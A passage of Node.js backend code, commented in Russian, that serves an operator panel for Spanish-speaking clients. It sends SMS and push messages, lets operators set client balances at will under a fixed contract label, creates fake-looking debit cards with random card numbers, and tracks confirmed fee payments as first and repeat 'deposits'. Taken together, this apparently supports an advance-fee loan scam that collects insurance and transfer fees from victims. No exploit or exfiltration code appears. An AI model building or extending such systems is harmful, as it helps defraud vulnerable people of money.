  } catch (err) {
    console.error('[admin-edited-messages]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpRequestCall(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const comment = sanitizeString(getString(body.comment), 500);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    });
    const existingSub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      // ПРОЗВОН из чата: сбрасываем operatorCalled → прозвонщик видит заказ в основной очереди.
      // Чат остаётся у чат-оператора за счёт фильтра по status='ЧАТ: НУЖЕН ЗВОНОК' (см. handleChatOpClients).
      create: { flowSessionId: sessionId, callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
      update: { callRequested: true, operatorCalled: false, operatorStatus: 'pending', status: 'ЧАТ: НУЖЕН ЗВОНОК', submissionData: { ...existingSub, ...(comment ? { chatOpNote: comment } : {}) } },
    });
    sendToTelegram(`*📞 ЧАТ-ОПЕРАТОР: ЗАКАЗАН ЗВОНОК*\nSession: \`${sessionId}\`${comment ? `\nКомментарий: _${comment}_` : ''}`);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/request-call]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSaveNote(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const note = sanitizeString(getString(body.note), 2000);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      create: { flowSessionId: sessionId, callerNote: note || null },
      update: { callerNote: note || null },
    });
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[chat-op/note]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleChatOpSendPush(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    console.log(`[Push] Manual push request | session=${sessionId.slice(0, 12)}... | tokens in store=${pushTokens.size}`);
    const token = pushTokens.get(sessionId);
    if (!token) {
      console.log(`[Push] Manual push FAILED — no token for session=${sessionId.slice(0, 12)}... | known sessions: [${[...pushTokens.keys()].map(k => k.slice(0,8)).join(', ')}]`);
      return reply.send({ ok: false, reason: 'no_token' });
    }
    console.log(`[Push] Manual push sending | session=${sessionId.slice(0, 12)}... | token=${token.slice(0, 16)}...`);
    const settings = await readPushSettings();
    const sent = await sendPush(token, settings.title || '¡Tienes un nuevo mensaje!', settings.body || 'Hemos enviado una respuesta. Abre el chat para verla.', settings.url);
    console.log(`[Push] Manual push ${sent ? 'sent OK' : 'FAILED (FCM error)'} | session=${sessionId.slice(0, 12)}...`);
    return reply.send({ ok: sent });
  } catch (err) {
    console.error('[chat-op/send-push]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// Единый отправитель SMS через elite-gateway. sender — имя отправителя (SID).
// Если sender не задан — берём из настроек (по умолчанию «AvalAvance»).
async function sendSmsViaGateway(number, text, sender) {
  const { apiKey, sid, baseUrl } = config.eliteGateway;
  const from = (sender && String(sender).trim()) || sid;
  const res = await fetch(`${baseUrl}/api/send/sms`, {
    method: 'POST',
    headers: { 'api-key': apiKey, 'Content-Type': 'application/json' },
    body: JSON.stringify({ SID: from, Content: text, number }),
  });
  const rawText = await res.text();
  let json = {};
  try { json = JSON.parse(rawText); } catch { /* не JSON */ }
  const ok = json.Success == 100 || json.suc === true;
  const messageId = json.ID || json.message_id || null;
  return { ok, messageId, status: res.status, raw: rawText, json };
}

async function logSms(entry) {
  await mkdir(join(process.cwd(), 'data'), { recursive: true }).catch(() => {});
  await appendFile(smsLogFile, JSON.stringify(entry) + '\n').catch(() => {});
}

async function handleChatOpSendSms(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const phone = sanitizeString(getString(body.phone), 30).replace(/\s+/g, '');
    const text  = sanitizeString(getString(body.text), 1600);
    if (!phone) return reply.status(400).send({ ok: false, error: 'phone required' });
    if (!text)  return reply.status(400).send({ ok: false, error: 'text required' });

    // Ручная отправка оператором — отправитель по умолчанию из gateway (без изменений).
    const { ok, messageId, status, raw, json } = await sendSmsViaGateway(phone, text);
    console.log(`[SMS] status=${status} raw=${raw}`);
    console.log(`[SMS] phone=${phone} ok=${ok} id=${messageId}`);

    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const entry = {
      sentAt: new Date().toISOString(), sessionId: sessionId || null, phone, text, ok, messageId,
      type: 'operator',
      handlerId: chatOpHandlerId(req), // null — вход по общему логину из .env
      error: ok ? null : (json.message || json.Error || 'gateway_error'),
    };
    await logSms(entry);

    if (!ok) return reply.send({ ok: false, error: entry.error });
    return reply.send({ ok: true, messageId });
  } catch (err) {
    console.error('[chat-op/send-sms]', err?.message || err);
    return reply.status(500).send({ ok: false, error: 'server_error' });
  }
}

async function readSmsLog() {
  try {
    const raw = await readFile(smsLogFile, 'utf8');
    return raw.trim().split('\n').filter(Boolean).map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean).reverse();
  } catch { return []; }
}

async function handleChatOpSmsHistory(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  const all = await readSmsLog();
  return reply.send({ entries: sessionId ? all.filter(e => e.sessionId === sessionId) : all });
}

async function handleAdminSmsHistory(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const [all, handlers] = await Promise.all([
    readSmsLog(),
    prisma.handler.findMany({ select: { id: true, name: true } }).catch(() => []),
  ]);
  const nameById = new Map(handlers.map((h) => [h.id, h.name]));
  // handlerName — имя оператора; для старых записей (без handlerId) остаётся null.
  const entries = all.map((e) => ({
    ...e,
    handlerName: e.handlerId ? (nameById.get(e.handlerId) || null) : null,
  }));
  return reply.send({ entries });
}

// ── SMS Reminder for stalled clients ──────────────────────────────────────────
const smsReminderLog = new Map(); // flowSessionId -> { lastReminderAt }
const smsReminderState = new Map(); // flowSessionId -> { status, statusSince, sentAt }
const SMS_REMINDER_STATE_FILE = join(process.cwd(), 'data', 'sms-reminder-state.json');
export const SMS_REMINDER_ELIGIBLE_STATUSES = new Set(FUNNEL_STATUSES.slice(0, 5));

// Напоминание — один раз на клиента, навсегда. Старый лог остаётся железным дедупом,
// а отдельный state-файл хранит текущий отслеживаемый статус и момент, с которого
// клиент на нём стоит. Новая выборка начинается от smsReminderEnabledAt.
async function loadSmsReminderLog() {
  try {
    for (const e of await readSmsLog()) {
      if (e?.type === 'auto' && e.flowSessionId) {
        smsReminderLog.set(e.flowSessionId, { lastReminderAt: Date.parse(e.sentAt) || 0 });
      }
    }
    console.log(`[SMS-reminder] дедуп: ${smsReminderLog.size} клиентов уже получили напоминание`);
  } catch (err) {
    console.error('[sms-reminder/load]', err?.message);
  }
}

function normalizeSmsReminderStateEntry(entry) {
  if (!entry || typeof entry !== 'object') return null;
  return {
    status: typeof entry.status === 'string' ? entry.status : null,
    statusSince: Number.isFinite(Number(entry.statusSince)) ? Number(entry.statusSince) : 0,
    sentAt: Number.isFinite(Number(entry.sentAt)) ? Number(entry.sentAt) : null,
    phone: normalizeReminderPhone(entry.phone),
  };
}

function normalizeReminderPhone(value) {
  const raw = String(value || '').trim();
  if (!raw) return null;
  const digits = raw.replace(/\D/g, '');
  if (!digits) return null;
  if (digits.length === 9) return `+34${digits}`;
  return `+${digits}`;
}

async function loadSmsReminderState() {
  try {
    const raw = JSON.parse(await readFile(SMS_REMINDER_STATE_FILE, 'utf8'));
    for (const [flowSessionId, entry] of Object.entries(raw || {})) {
      const normalized = normalizeSmsReminderStateEntry(entry);
      if (normalized) smsReminderState.set(flowSessionId, normalized);
    }
    console.log(`[SMS-reminder] state: ${smsReminderState.size} tracked clients`);
  } catch {
    // First run: no state file yet.
  }
}

async function saveSmsReminderState() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    const data = Object.fromEntries(smsReminderState);
    await writeFile(SMS_REMINDER_STATE_FILE, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error('[sms-reminder/state]', err?.message);
  }
}

async function rememberSmsReminderPhone(flowSessionId, rawPhone) {
  if (!flowSessionId) return;
  const phone = normalizeReminderPhone(rawPhone);
  if (!phone) return;
  const state = smsReminderState.get(flowSessionId) || {};
  if (state.phone === phone) return;
  smsReminderState.set(flowSessionId, { ...state, phone });
  await saveSmsReminderState();
}

async function ensureSmsReminderEnabledAt(settings, now) {
  const enabledAt = Date.parse(settings.smsReminderEnabledAt || '');
  if (Number.isFinite(enabledAt)) return enabledAt;
  const iso = new Date(now).toISOString();
  settings.smsReminderEnabledAt = iso;
  await writeSettings(settings);
  return now;
}

// Потолок на один проход (проход раз в минуту). Обычно новых клиентов в проходе
// единицы и потолок не мешает — он страхует от залпа, если разом застрянет толпа.
// 08.07 залп (~230 SMS за 20 минут) шлюз отрубил после ~106 штук: дальше всё
// уходило в ok=false. Остаток разойдётся следующими проходами.
const AUTO_SMS_MAX_PER_RUN = 10;

// Проход раз в 60с, но сам он может идти дольше (каждая отправка — запрос к шлюзу).
// Без этого флага проходы накладывались и слали одному клиенту по 2–4 SMS: отметка
// «уже отправлено» ставилась только ПОСЛЕ ответа шлюза, и параллельный проход успевал
// взять того же клиента снова.
let smsReminderRunning = false;

// Последняя активность в чате. webClient.updatedAt от переписки не двигается
// (строка трогается лишь при открытии чата), поэтому клиент в живом диалоге
// выглядит «застрявшим на 2 часа» и получил бы СМС посреди разговора. Берём
// время последнего сообщения — любой стороны: пока диалог идёт, не напоминаем.
async function lastChatActivityMap(sessionIds) {
  const map = new Map(); // flowSessionId -> ms
  if (!sessionIds.length) return map;
  try {
    const leads = await prisma.lead.findMany({
      where: { tgId: { in: sessionIds.map((s) => chatLeadKey(s)) } },
      select: {
        tgId: true,
        messages: { select: { createdAt: true }, orderBy: { createdAt: 'desc' }, take: 1 },
      },
    });
    for (const l of leads) {
      const at = l.messages[0]?.createdAt;
      if (at && l.tgId.startsWith('chat:')) {
        map.set(l.tgId.slice('chat:'.length), new Date(at).getTime());
      }
    }
  } catch (e) {
    console.error('[sms-reminder/activity]', e?.message);
  }
  return map;
}

async function sendSmsRemindersToStalledClients() {
  if (smsReminderRunning) return; // предыдущий проход ещё идёт — не накладываемся
  smsReminderRunning = true;
  try {
    const settings = await readSettings();
    if (!settings.smsReminderEnabled) return;
    const mode = resolveSmsReminderMode(settings); // 'reminder' | 'review' (off отсеян выше)

    const now = Date.now();
    const enabledAt = await ensureSmsReminderEnabledAt(settings, now);
    const reminderWindow = (settings.smsReminderMinutes || 20) * 60 * 1000;

    const clients = await prisma.webClient.findMany({
      where: {
        createdAt: { gte: new Date(enabledAt) },
      },
      orderBy: { createdAt: 'asc' },
      select: {
        flowSessionId: true, createdAt: true, submissionData: true,
        captchaPassed: true, operatorStatus: true,
      },
    });

    if (!clients.length) return;

    const funnelMap = await computeFunnelMap(clients);
    const chatActivity = await lastChatActivityMap(clients.map((c) => c.flowSessionId).filter(Boolean));

    let sentThisRun = 0;
    let stateChanged = false;
    for (const client of clients) {
      if (sentThisRun >= AUTO_SMS_MAX_PER_RUN) {
        console.log(`[SMS-reminder] потолок ${AUTO_SMS_MAX_PER_RUN}/проход — остальные уйдут через минуту`);
        break;
      }

      if (!client.flowSessionId) continue;

      let state = smsReminderState.get(client.flowSessionId);
      if (smsReminderLog.has(client.flowSessionId) || state?.sentAt) {
        if (!state?.sentAt) {
          state = { ...(state || {}), sentAt: smsReminderLog.get(client.flowSessionId)?.lastReminderAt || now };
          smsReminderState.set(client.flowSessionId, state);
          stateChanged = true;
        }
        continue;
      }

      const funnelStatus = funnelMap.get(client.flowSessionId);
      if (!SMS_REMINDER_ELIGIBLE_STATUSES.has(funnelStatus)) {
        if (state?.status !== funnelStatus) {
          smsReminderState.set(client.flowSessionId, {
            ...(state || {}),
            status: funnelStatus || null,
            statusSince: now,
          });
          stateChanged = true;
        }
        continue;
      }

      if (!state || state.status !== funnelStatus) {
        state = { ...(state || {}), status: funnelStatus, statusSince: now, sentAt: null };
        smsReminderState.set(client.flowSessionId, state);
        stateChanged = true;
        continue;
      }

      if (!state.statusSince) {
        state.statusSince = now;
        stateChanged = true;
        continue;
      }

      if (now - state.statusSince < reminderWindow) continue;

      const lastMsgAt = chatActivity.get(client.flowSessionId) || 0;
      if (now - lastMsgAt < reminderWindow) continue;

      const phone = state.phone;
      if (!phone) continue;

      smsReminderLog.set(client.flowSessionId, { lastReminderAt: now });

      const text = settings.smsReminderText || 'Привет';
      const { ok, messageId } = await sendSmsViaGateway(phone, text, settings.smsReminderSender || 'AvalAvance');
      sentThisRun++;

      console.log(`[SMS-reminder] flowSessionId=${client.flowSessionId} phone=${phone} ok=${ok}`);

      const entry = {
        sentAt: new Date().toISOString(),
        flowSessionId: client.flowSessionId,
        phone,
        text,
        status: funnelStatus,
        ok,
        messageId,
        type: 'auto', // Mark as automatic reminder
      };
      await logSms(entry);
      state.sentAt = now;
      smsReminderState.set(client.flowSessionId, state);
      stateChanged = true;

      // Только в режиме 'review': заодно предлагаем клиенту оставить отзыв. Флаг
      // подхватят и открытые вкладки (через SSE), и следующий заход на любую страницу.
      // В режиме 'reminder' шлём чистое СМС без редиректа.
      if (mode === 'review') {
        try {
          await mergeSubmissionData(client.flowSessionId, { reviewPromptAt: new Date().toISOString() });
          pushClientEvent(client.flowSessionId, { type: 'review' });
        } catch (e) {
          console.error('[sms-reminder/review-prompt]', e?.message);
        }
      }
    }
    if (stateChanged) await saveSmsReminderState();
  } catch (err) {
    console.error('[sms-reminder] error:', err?.message);
  } finally {
    smsReminderRunning = false;
  }
}

async function handleSupportChatMarkRead(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.send({ ok: true });
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    });
    const sub = (existing?.submissionData && typeof existing.submissionData === 'object') ? existing.submissionData : {};
    await prisma.webClient.upsert({
      where: { flowSessionId: sessionId },
      create: { flowSessionId: sessionId, submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
      update: { submissionData: { ...sub, chatLastReadAt: new Date().toISOString() } },
    });
    return reply.send({ ok: true });
  } catch { return reply.send({ ok: true }); }
}

// ── Charge (chat-op debits client balance) ────────────────────────────────────
async function handleChatOpCharge(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const amount = parseFloat(body.amount);
    const rawDescription = sanitizeString(getString(body.description), 200);
    const defaultContractLabel = 'Contrato Nº ES-4738D9215';
    const legacyDefaultDescriptions = new Set(['\u0421\u043f\u0438\u0441\u0430\u043d\u0438\u0435']);
    const contractLabel = (!rawDescription || legacyDefaultDescriptions.has(rawDescription))
      ? defaultContractLabel
      : rawDescription;
    if (!sessionId || !isFinite(amount) || amount <= 0) {
      return reply.status(400).send({ error: 'invalid_params' });
    }
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { balance: true, transactions: true, submissionData: true },
    });
    if (!wc) return reply.status(404).send({ error: 'not_found' });
    const newBalance = Math.max(0, (wc.balance ?? 5000) - amount);
    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
    txs.push({
      id: randomUUID(),
      type: 'debit',
      amount,
      description: getClientTransferDescription(wc.submissionData),
      contractLabel,
      date: new Date().toISOString(),
    });
    await prisma.webClient.update({
      where: { flowSessionId: sessionId },
      data: { balance: newBalance, transactions: txs },
    });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, balance: newBalance });
  } catch (err) {
    console.error('[chat-op/charge]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Refund (chat-op credits client balance) ───────────────────────────────────
async function handleChatOpRefund(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const amount = parseFloat(body.amount);
    const rawDescription = sanitizeString(getString(body.description), 200);
    const defaultContractLabel = 'Contrato Nº ES-4738D9215';
    const contractLabel = rawDescription || defaultContractLabel;
    if (!sessionId || !isFinite(amount) || amount <= 0) {
      return reply.status(400).send({ error: 'invalid_params' });
    }
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { balance: true, transactions: true },
    });
    if (!wc) return reply.status(404).send({ error: 'not_found' });
    const newBalance = (wc.balance ?? 5000) + amount;
    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
    txs.push({ id: randomUUID(), type: 'credit', amount, description: 'Saldo restituido', contractLabel, date: new Date().toISOString() });
    await prisma.webClient.update({
      where: { flowSessionId: sessionId },
      data: { balance: newBalance, transactions: txs },
    });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, balance: newBalance });
  } catch (err) {
    console.error('[chat-op/refund]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Debet-карта: баланс хранится как сумма её транзакций, начиная с 0 ─────────
// account_activation — факт создания карты (amount 0), card_credit/card_debit —
// пополнения/списания. Баланс карты НИКАК не связан с основным балансом (5000).
function computeCardState(rawTxs) {
  let exists = false;
  let balance = 0;
  let last4 = '';
  (Array.isArray(rawTxs) ? rawTxs : []).forEach((t) => {
    if (!t) return;
    if (t.type === 'account_activation') {
      exists = true;
      if (t.cardLast4) last4 = t.cardLast4;
      balance += Number(t.amount) || 0;
    } else if (t.type === 'card_credit') {
      balance += Number(t.amount) || 0;
    } else if (t.type === 'card_debit') {
      balance -= Number(t.amount) || 0;
    }
  });
  if (balance < 0) balance = 0;
  return { exists, balance, last4 };
}

// ── Add account (chat-op создаёт debet-карту с нулевым балансом) ──────────────
async function handleChatOpAddAccount(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const rawNote = sanitizeString(getString(body.note), 200);
    const note = rawNote || 'Se ha abonado una compensación por los gastos';
    if (!sessionId) return reply.status(400).send({ error: 'invalid_params' });
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { transactions: true },
    });
    if (!wc) return reply.status(404).send({ error: 'not_found' });
    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
    // Карта уже создана — повторно не создаём, просто возвращаем состояние.
    if (txs.some((t) => t && t.type === 'account_activation')) {
      const st = computeCardState(txs);
      return reply.send({ ok: true, exists: true, balance: st.balance, last4: st.last4 });
    }
    const cardLast4 = String(Math.floor(1000 + Math.random() * 9000));
    txs.push({
      id: randomUUID(),
      type: 'account_activation',
      amount: 0, // debet-карта создаётся с нулевым балансом
      description: 'Cuenta de débito activada',
      note,
      cardLast4,
      date: new Date().toISOString(),
    });
    await prisma.webClient.update({
      where: { flowSessionId: sessionId },
      data: { transactions: txs },
    });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, exists: true, balance: 0, last4: cardLast4 });
  } catch (err) {
    console.error('[chat-op/add-account]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Текущее состояние debet-карты (существует ли, баланс, last4) ──────────────
async function handleChatOpCardState(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const q = asRecord(req.query) ?? {};
    const sessionId = sanitizeString(getString(q.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'invalid_params' });
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { transactions: true },
    });
    if (!wc) return reply.send({ ok: true, exists: false, balance: 0, last4: '' });
    return reply.send({ ok: true, ...computeCardState(wc.transactions) });
  } catch (err) {
    console.error('[chat-op/card]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Пополнение/списание debet-карты (не трогает основной баланс) ──────────────
async function handleChatOpCardMovement(req, reply, kind) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const amount = parseFloat(body.amount);
    const rawNote = sanitizeString(getString(body.note), 200);
    if (!sessionId || !isFinite(amount) || amount <= 0) {
      return reply.status(400).send({ error: 'invalid_params' });
    }
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { transactions: true },
    });
    if (!wc) return reply.status(404).send({ error: 'not_found' });
    const txs = Array.isArray(wc.transactions) ? [...wc.transactions] : [];
    if (!txs.some((t) => t && t.type === 'account_activation')) {
      return reply.status(400).send({ error: 'no_card' });
    }
    const isCredit = kind === 'credit';
    const note = rawNote || (isCredit ? 'Se ha abonado una compensación por los gastos' : 'Cargo en la tarjeta');
    txs.push({
      id: randomUUID(),
      type: isCredit ? 'card_credit' : 'card_debit',
      amount,
      description: isCredit ? 'Recarga de tarjeta' : 'Cargo en tarjeta',
      note,
      date: new Date().toISOString(),
    });
    await prisma.webClient.update({
      where: { flowSessionId: sessionId },
      data: { transactions: txs },
    });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, balance: computeCardState(txs).balance });
  } catch (err) {
    console.error('[chat-op/card-move]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}
async function handleChatOpCardRefund(req, reply) { return handleChatOpCardMovement(req, reply, 'credit'); }
async function handleChatOpCardCharge(req, reply) { return handleChatOpCardMovement(req, reply, 'debit'); }

async function handleGetClientBalance(req, reply) {
  const sessionId = sanitizeString(req.params.sessionId || '', 80);
  if (!sessionId) return reply.send({ balance: 5000, transactions: [] });
  try {
    const wc = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { balance: true, transactions: true },
    });
    if (!wc) return reply.send({ balance: 5000, transactions: [] });
    return reply.send({
      balance: wc.balance ?? 5000,
      transactions: Array.isArray(wc.transactions) ? wc.transactions : [],
    });
  } catch (err) {
    console.error('[tourist/balance]', err?.message || err);
    return reply.send({ balance: 5000, transactions: [] });
  }
}

// ── Push notifications ────────────────────────────────────────────────────────
const PUSH_SETTINGS_FILE = join(process.cwd(), 'data', 'push-settings.json');
const PUSH_TOKENS_FILE   = join(process.cwd(), 'data', 'push-tokens.json');
const DEFAULT_PUSH = { title: '¡Tienes un nuevo mensaje!', body: 'Hemos enviado una respuesta. Abre el chat para verla.', url: 'https://avalavanceapp.com/tourist/chat.html', delayMinutes: 3, enabled: true };

// sessionId -> FCM device token (persisted to disk)
const pushTokens = new Map();
// sessionId -> setTimeout handle (pending push)
const pendingPush = new Map();

async function loadPushTokens() {
  try {
    const data = JSON.parse(await readFile(PUSH_TOKENS_FILE, 'utf8'));
    for (const [k, v] of Object.entries(data)) pushTokens.set(k, v);
    console.log(`[Push] Loaded ${pushTokens.size} FCM token(s) from disk:`);
    for (const [k, v] of pushTokens) {
      console.log(`  session=${k.slice(0, 12)}... token=${v.slice(0, 20)}...`);
    }
  } catch { console.log('[Push] No push-tokens.json found — starting fresh'); }
}

async function savePushTokens() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    await writeFile(PUSH_TOKENS_FILE, JSON.stringify(Object.fromEntries(pushTokens), null, 2), 'utf8');
  } catch (e) {
    console.error('[Push] Failed to save tokens:', e?.message);
  }
}

async function readPushSettings() {
  try { return { ...DEFAULT_PUSH, ...JSON.parse(await readFile(PUSH_SETTINGS_FILE, 'utf8')) }; }
  catch { return { ...DEFAULT_PUSH }; }
}
async function writePushSettings(data) {
  await mkdir(join(process.cwd(), 'data'), { recursive: true });
  await writeFile(PUSH_SETTINGS_FILE, JSON.stringify(data, null, 2), 'utf8');
}

async function schedulePush(sessionId) {
  const settings = await readPushSettings();
  if (!settings.enabled) {
    console.log(`[Push] schedulePush skipped — push disabled | session=${sessionId.slice(0, 12)}...`);
    return;
  }
  const token = pushTokens.get(sessionId);
  if (!token) {
    console.log(`[Push] schedulePush skipped — no token | session=${sessionId.slice(0, 12)}... | tokens in store=${pushTokens.size}`);
    return;
  }
  cancelPush(sessionId);
  const delay = Math.max(1, Number(settings.delayMinutes) || 3) * 60 * 1000;
  console.log(`[Push] Scheduled in ${Math.round(delay/1000)}s | session=${sessionId.slice(0, 12)}...`);
  const handle = setTimeout(async () => {
    pendingPush.delete(sessionId);
    console.log(`[Push] Sending scheduled push | session=${sessionId.slice(0, 12)}...`);
    const ok = await sendPush(token, settings.title, settings.body, settings.url);
    console.log(`[Push] Scheduled push ${ok ? 'sent OK' : 'FAILED'} | session=${sessionId.slice(0, 12)}...`);
  }, delay);
  pendingPush.set(sessionId, handle);
}

function cancelPush(sessionId) {
  const h = pendingPush.get(sessionId);
  if (h) { clearTimeout(h); pendingPush.delete(sessionId); }
}

async function handleRegisterPushToken(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const token = sanitizeString(getString(body.token), 200);
    if (!sessionId || !token) {
      console.warn(`[Push] Register rejected — missing fields: sessionId=${!!sessionId} token=${!!token}`);
      return reply.status(400).send({ error: 'missing fields' });
    }
    const isNew = !pushTokens.has(sessionId);
    const changed = !isNew && pushTokens.get(sessionId) !== token;
    pushTokens.set(sessionId, token);
    savePushTokens();
    console.log(`[Push] Token ${isNew ? 'NEW' : changed ? 'UPDATED' : 'refreshed'} | session=${sessionId.slice(0, 12)}... | token=${token.slice(0, 16)}... | total=${pushTokens.size}`);
    return reply.send({ ok: true });
  } catch (e) {
    console.error('[Push] handleRegisterPushToken error:', e?.message);
    return reply.status(500).send({ error: 'server error' });
  }
}

async function handleGetPushSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  return reply.send(await readPushSettings());
}

async function handleSavePushSettings(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const body = asRecord(req.body) ?? {};
  const current = await readPushSettings();
  const updated = {
    title: sanitizeString(getString(body.title) || current.title, 100),
    body: sanitizeString(getString(body.body) || current.body, 200),
    url: sanitizeString(getString(body.url) || current.url || '', 300),
    delayMinutes: Math.max(1, Math.min(60, Number(body.delayMinutes) || current.delayMinutes)),
    enabled: body.enabled !== undefined ? !!body.enabled : current.enabled,
  };
  await writePushSettings(updated);
  return reply.send(updated);
}

// ── Payment screenshot confirm / reject ───────────────────────────────────────
async function handleGetPaymentStatus(req, reply) {
  const sessionId = sanitizeString(getString(req.query?.sessionId ?? ''), 80);
  const type = normalizePaymentType(sanitizeString(getString(req.query?.type ?? ''), 24));
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  return reply.send(getPaymentStatus(sessionId, type));
}

// Имя чат-оператора, подтвердившего оплату (для списка платежей в админке).
async function resolveChatOpName(req) {
  const hid = chatOpHandlerId(req);
  if (!hid) return 'Оператор';
  try {
    const h = await prisma.handler.findUnique({ where: { id: hid }, select: { name: true } });
    return h?.name || 'Оператор';
  } catch { return 'Оператор'; }
}

async function handlePaymentConfirm(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const body = asRecord(req.body) ?? {};
  const sessionId = sanitizeString(getString(body.sessionId), 80);
  const type = normalizePaymentType(sanitizeString(getString(body.type), 24));
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  const key = paymentStatusKey(sessionId, type);
  const ps = paymentStatus.get(key) || { type };
  const confirmedAtMs = Date.now();
  // Скриншот: из тела (подтверждение из чата по картинке) либо уже сохранённый url со страницы оплаты.
  const bodyUrl = sanitizeString(getString(body.screenshotUrl), 300);
  const screenshotUrl = bodyUrl.startsWith('/uploads/') ? bodyUrl : (ps.url || '');
  const confirmedByName = await resolveChatOpName(req);
  paymentStatus.set(key, {
    ...ps,
    type,
    status: 'confirmed',
    confirmedAt: confirmedAtMs,
    url: screenshotUrl,
    confirmedByHandlerId: chatOpHandlerId(req),
    confirmedByName,
  });
  await savePaymentStatus();
  // Only a payment confirmed by the chat operator affects the requisites status.
  await markRequisitePayment(sessionId);
  // Депозит для когортной статистики: insurance→FD, return→RD, loantransfer→RD2, creditcard→RD3.
  await recordDeposit(sessionId, type, new Date(confirmedAtMs));
  notifyClients();
  return reply.send({ ok: true });
}

// Идемпотентная запись депозита (по flowSessionId+type). Сумма — из настроек.
async function recordDeposit(sessionId, paymentType, confirmedAt) {
  try {
    const depType = paymentType === 'creditcard'
      ? 'RD3'
      : (paymentType === 'loantransfer' ? 'RD2' : (paymentType === 'return' ? 'RD' : 'FD'));
    const s = await readSettings();
    const amount = depType === 'RD3'
      ? depositRD3Amount(s)
      : (depType === 'RD2'
        ? depositRD2Amount(s)
        : (depType === 'RD' ? (s.depositRD ?? 190) : (s.depositFD ?? 100)));
    const wc = await prisma.webClient.findUnique({ where: { flowSessionId: sessionId }, select: { id: true } });
    if (!wc) return;
    await prisma.deposit.upsert({
      where: { flowSessionId_type: { flowSessionId: sessionId, type: depType } },
      create: { clientId: wc.id, flowSessionId: sessionId, type: depType, amount, confirmedAt },
      update: {}, // уже есть — не дублируем и не меняем исходную дату/сумму
    });
  } catch (e) {
    console.error('[deposit/record]', e?.message);
  }
}

async function handlePaymentReject(req, reply) {
  if (!requireChatOp(req, reply)) return;
  const body = asRecord(req.body) ?? {};
